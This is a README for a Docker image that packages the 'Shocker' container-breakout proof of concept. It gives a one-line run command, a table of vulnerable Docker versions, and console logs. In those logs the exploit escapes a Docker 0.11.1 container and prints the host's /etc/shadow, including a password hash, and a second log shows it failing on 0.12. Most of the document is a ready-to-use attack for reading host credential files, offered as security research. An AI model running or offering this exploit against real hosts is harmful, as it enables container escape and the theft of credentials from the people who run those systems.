# Shocker / Docker Breakout PoC

This is a Docker Image used to test container breakout exploit first posted here:
http://stealth.openwall.net/xSports/shocker.c

The container will attempt to find and print contents of the Docker host's /etc/shadow.

## Usage

To run the PoC exploit use:

    docker run gabrtv/shocker

## Building

To modify source and rebuild, use:

    docker build -t gabrtv/shocker .

## Vulnerability Matrix

Simple table outlining vulnerability to **this particular** exploit.  PRs welcome!

| Docker Version | Docker Host OS    | Vulnerable? |
| -------------- | ----------------- | ----------- |
| 0.10.0         | Ubuntu 12.04 LTS  | Yes         |
| 0.11.0         | Ubuntu 12.04 LTS  | Yes         |
| 0.11.1         | Ubuntu 12.04 LTS  | Yes         |
| 0.12.0         | Ubuntu 12.04 LTS  | No          |
| 1.0            | Boot2Docker       | No          |
| 1.0            | CoreOS v343.0.0+  | No          |
| 1.0            | Ubuntu 12.04 LTS  | No          |

## Examples

Confirmed vulnerable: Docker 0.11.1 running Ubuntu 12.04 LTS

```
root@precise64:~# docker version
Client version: 0.11.1
Client API version: 1.11
Go version (client): go1.2.1
Git commit (client): fb99f99
Server version: 0.11.1
Server API version: 1.11
Git commit (server): fb99f99
Go version (server): go1.2.1
Last stable version: 1.0.0, please update docker

root@precise64:~# docker info
Containers: 6
Images: 10
Storage Driver: aufs
 Root Dir: /var/lib/docker/aufs
 Dirs: 22
Execution Driver: native-0.2
Kernel Version: 3.8.0-42-generic
WARNING: No swap limit support

root@precise64:~# docker run gabrtv/shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'etc/shadow'
[*] Found vmlinuz
[*] Found vagrant
[*] Found lib64
[*] Found usr
[*] Found ...
[*] Found etc
[+] Match: etc ino=3932161
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'shadow'
[*] Found timezone
[*] Found cron.hourly
...
[*] Found skel
[*] Found shadow
[+] Match: shadow ino=3935729
[*] Brute forcing remaining 32bit. This can take a while...
[*] (shadow) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0xf1, 0x0d, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0xf1, 0x0d, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
root:!:15597:0:99999:7:::
daemon:*:15597:0:99999:7:::
bin:*:15597:0:99999:7:::
sys:*:15597:0:99999:7:::
sync:*:15597:0:99999:7:::
games:*:15597:0:99999:7:::
man:*:15597:0:99999:7:::
lp:*:15597:0:99999:7:::
mail:*:15597:0:99999:7:::
news:*:15597:0:99999:7:::
uucp:*:15597:0:99999:7:::
proxy:*:15597:0:99999:7:::
www-data:*:15597:0:99999:7:::
backup:*:15597:0:99999:7:::
list:*:15597:0:99999:7:::
irc:*:15597:0:99999:7:::
gnats:*:15597:0:99999:7:::
nobody:*:15597:0:99999:7:::
libuuid:!:15597:0:99999:7:::
syslog:*:15597:0:99999:7:::
messagebus:*:15597:0:99999:7:::
ntp:*:15597:0:99999:7:::
sshd:*:15597:0:99999:7:::
vagrant:$6$aqzOtgCM$OxgoMP4JoqMJ1U1F3MZPo2iBefDRnRCXSfgIM36E5cfMNcE7GcNtH1P/tTC2QY3sX3BxxJ7r/9ciScIVTa55l0:15597:0:99999:7:::
vboxadd:!:15597::::::
statd:*:15597:0:99999:7:::
```

Exploit fails on Docker 0.12:

```
root@precise64:~# docker version
Client version: 0.12.0
Client API version: 1.12
Go version (client): go1.2.1
Git commit (client): 14680bf
Server version: 0.12.0
Server API version: 1.12
Go version (server): go1.2.1
Git commit (server): 14680bf

root@precise64:~# docker info
Containers: 5
Images: 10
Storage Driver: aufs
 Root Dir: /var/lib/docker/aufs
 Dirs: 20
Execution Driver: native-0.2
Kernel Version: 3.8.0-42-generic
WARNING: No swap limit support

root@precise64:~# docker run gabrtv/shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'etc/shadow'
[-] open_by_handle_at: Operation not permitted
```

## License

BSD
